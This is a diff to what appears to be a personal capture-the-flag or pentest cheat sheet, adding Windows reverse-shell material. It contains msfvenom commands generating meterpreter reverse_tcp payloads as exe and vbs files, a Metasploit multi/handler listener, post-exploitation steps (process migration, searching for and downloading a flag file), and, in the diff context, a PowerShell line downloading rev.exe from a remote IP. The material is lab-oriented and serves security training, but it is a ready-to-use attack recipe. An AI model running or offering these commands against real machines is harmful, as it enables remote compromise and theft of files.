@@ -166,18 +166,32 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 
 **WINDOWS**
 Payload
-`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o rev.exe`
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o rev.exe
+# or
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f vbs -o rev.vbs
+```
 
 Run Listener on the background
-```
+```bash
 meterpreter > background
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 10.10.10.10
 set LPORT 4443
 run -j
-```
 
+# things to do
+sessions -l
+session 1
+meterpreter > sysinfo
+meterpreter > run post/windows/manage/migrate
+meterpreter > search -f flag.txt
+meterpreter > download 'c:\Users\thm\Desktop\flag.txt'
+meterpreter > cat 'c:\Users\thm\Desktop\flag.txt'
+```
+> msf cheatsheet: https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/
+ 
 ### Netcat Listener
 
 **WINDOWS**
